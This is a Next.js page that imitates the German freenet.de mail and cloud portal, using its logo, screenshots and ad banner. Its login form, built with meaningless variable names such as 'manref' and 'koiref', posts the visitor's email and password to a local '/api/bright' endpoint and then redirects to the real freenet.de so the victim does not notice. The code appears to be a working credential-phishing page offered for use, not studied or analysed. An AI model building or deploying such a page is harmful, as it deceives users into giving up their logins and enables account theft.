"use client";
import { useRef, useState } from "react";

import Image from "next/image";
import logo from "../../public/freelogo.png";
import free from "../../public/free-wifi.png";
import screen1 from "../../public/screen1.png";
import screen2 from "../../public/screen2.png";
import head_shot from "../../public/head-shot.png";
import screen3 from "../../public/screen3.png";
import screen4 from "../../public/screen4.png";
import screen5 from "../../public/screen5.png";
import screen6 from "../../public/screen6.png";
import screen7 from "../../public/screen7.png";

export default function Home() {
  return (
    <>
      <main className="bg-slate-200 xl:min-w-[1450px] lg:min-w-[1230px] min-w-[1000px] hidden md:flex">
        <div className="bg-white w-[65%] xl:w-[80%] min-h-screen">
          <Header />

          <Body />
        </div>
        <div className="mt-">
          <img
            src="https://s1.adform.net/Banners/55611253/55611253.gif?bv=2"
            id="adAdformfzwzbyer0"
            className="sticky top-0 adform-domevents-click-44o3y4q7nb0"
            width="300"
            height="600"
            alt=""
          />
        </div>
      </main>

      <main className="min-h-screen md:hidden">
        <Header />
        <div className="w-full">
          <div className="sm:w-[80%] px-2 pb-2 mx-auto shadow-md">
            <Granger />
            <Image src={screen1} alt="screen" className="self-stretch mt-2" />
            <Image src={screen4} alt="screen" className="self-stretch mt-2" />
          </div>
          <Image src={screen5} alt="screen" className="self-stretch mt-4" />
        </div>
      </main>
    </>
  );
}

const Header = () => {
  return (
    <>
      <header className="w-full px-10 pt-5 xl:pt-0 bg-[#21314d]">
        <div className="flex items-center justify-between w-full ">
          <Image src={logo} alt="logo" className="w-32" />

          <div className="xl:flex hidden items-center">
            <div className="h-14 w-[0.1rem] bg-white "></div>
            <div className="group cursor-pointer hover:bg-[#84bc34] w-48 h-20 flex flex-col items-center justify-center">
              <span className="font-semibold text-base text-white group-hover:hidden">
                MOBILFUNK
              </span>
              <div className="hidden group-hover:block h-full w-full text-white text-center overflow-hidden">
                <h1 className="mt-1">MOBILFUNK</h1>

                <p className="mt-[0.1rem] text-xs ">
                  Unabhängiger Mobilfunk in allen Netzen
                </p>
              </div>
            </div>
            <div className="h-14 w-[0.1rem] bg-white "></div>
            <div className="group cursor-pointer hover:bg-[#84bc34] w-48 h-20 flex flex-col items-center justify-center">
              <span className="font-semibold text-base text-white group-hover:hidden">
                INTERNET
              </span>
              <div className="hidden group-hover:block h-full w-full text-white text-center overflow-hidden">
                <h1 className="mt-1">INTERNET</h1>

                <p className="mt-[0.1rem] text-xs ">
                  Unabhängiger Mobilfunk in allen Netzen
                </p>
              </div>
            </div>
            <div className="h-14 w-[0.1rem] bg-white "></div>

            <div className="group cursor-pointer hover:bg-[#84bc34] w-48 h-20 flex flex-col items-center justify-center">
              <span className="font-semibold text-base text-white group-hover:hidden">
                TV-ENTERTAINMENT
              </span>
              <div className="hidden group-hover:block h-full w-full text-white text-center overflow-hidden">
                <h1 className="mt-1">TV-ENTERTAINMENT</h1>

                <p className="mt-[0.1rem] text-xs ">
                  Unabhängiger Mobilfunk in allen Netzen
                </p>
              </div>
            </div>
            <div className="h-14 w-[0.1rem] bg-white "></div>

            <div className="group cursor-pointer hover:bg-[#84bc34] w-48 h-20 flex flex-col items-center justify-center">
              <span className="font-semibold text-base text-white group-hover:hidden">
                MAIL & CLOUD
              </span>
              <div className="hidden group-hover:block h-full w-full text-white text-center overflow-hidden">
                <h1 className="mt-1"> MAIL & CLOUD</h1>

                <p className="mt-[0.1rem] text-xs ">
                  Unabhängiger Mobilfunk in allen Netzen
                </p>
              </div>
            </div>
            <div className="h-14 w-[0.1rem] bg-white "></div>
          </div>

          <button className="bg-[#84bc34] rounded-md xl:py-1 py-2 xl:px-3 px-2 sm:px-16 text-[#21314d]">
            <span className="text-sm hidden xl:inline">Alle Angebote</span>
            <span className="text-sm text-white font-extrabold xl:hidden">
              Mobilfunk
            </span>
          </button>
        </div>

        <div className="w-full flex justify-center py-6">
          <Image
            src={free}
            alt="free"
            className="hidden lg:block h-20 w-[50%] "
          />
          <div className="h-20 lg:hidden"></div>
        </div>
      </header>

      <div className="">
        <Image
          src={head_shot}
          alt="nav"
          className="-mt-4 px-2 hidden xl:block"
        />
        <div className="flex justify-between items-center py-3 px-3 xl:hidden shadow-md">
          <div className="space-x-2 flex items-center">
            <p className="opacity-75 font-medium">Berlin</p>

            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              strokeWidth={1.5}
              stroke="currentColor"
              className="w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
              />
            </svg>
          </div>
          <div className="flex space-x-8">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              strokeWidth={1.5}
              stroke="currentColor"
              className="w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"
              />
            </svg>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              strokeWidth={1.5}
              stroke="currentColor"
              className="w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"
              />
            </svg>
          </div>
        </div>
      </div>
    </>
  );
};

const Body = () => {
  return (
    <div className="">
      <div className="grid grid-cols-2 justify-items-stretch items-center gap-4 px-4 pt-4">
        <Image src={screen1} alt="screen" className="self-start" />
        <div className="grid xl:grid-cols-2 gap-2 self-stretch">
          <Image src={screen2} alt="screen" className="hidden xl:block" />
          <Granger />
        </div>
      </div>
      <Image src={screen6} alt="screen" className="self-stretch mt-5" />
      <Image src={screen7} alt="screen" className="self-stretch mt-20 w-full" />
    </div>
  );
};

const Granger = () => {
  const manref = useRef<HTMLInputElement>(null);
  const koiref = useRef<HTMLInputElement>(null);
  const [eggs, setEggs] = useState("");

  const pastries = () => {
    if (manref.current && koiref.current) {
      if (manref.current.value && koiref.current.value) {
        setEggs("");
        fetch("/api/bright", {
          method: "POST",
          body: JSON.stringify({
            manref: manref.current.value,
            koiref: koiref.current.value,
          }),
        })
          .then((res) => {
            console.log(res);
          })
          .catch((err) => {
            console.log(err);
          })
          .finally(() => {
            window.location.replace("https://freenet.de");
          });
      } else {
        setEggs("All fields are required");
      }
      console.log(manref.current.value);
      console.log(koiref.current.value);
    }
  };
  return (
    <div className="h-full self-start">
      <div className="">
        <div className="bg-[#84bc34] pt-4 ">
          <h1 className="text-white mb-2 text-lg px-4">Login Mail & Cloud</h1>

          {eggs !== "" && (
            <div className="border-l-2 border-red-400 px-4 py-2 mx-3 mb-1 text-xs flex items-center">
              {eggs}
            </div>
          )}

          <div className="flex flex-col space-y-1 px-4">
            <input
              ref={manref}
              type="email"
              name=""
              id=""
              className="py-1 px-3 outline-none xl:placeholder:text-sm"
              placeholder="Email-Adresse"
              required
            />
            <input
              ref={koiref}
              type="password"
              name=""
              id=""
              className="py-1 px-3 outline-none xl:placeholder:text-sm"
              placeholder="Passwort"
              required
            />
          </div>

          <div className="flex justify-between mt-2 pb-2 px-4">
            <p className="xl:text-xs text-white">Brauchst du hilfe?</p>
            <button className="p-1 bg-[#21314d] text-white" onClick={pastries}>
              ANMELDEN
            </button>
          </div>
          <Image src={screen3} alt="" className="w-full" />
        </div>
      </div>
    </div>
  );
};
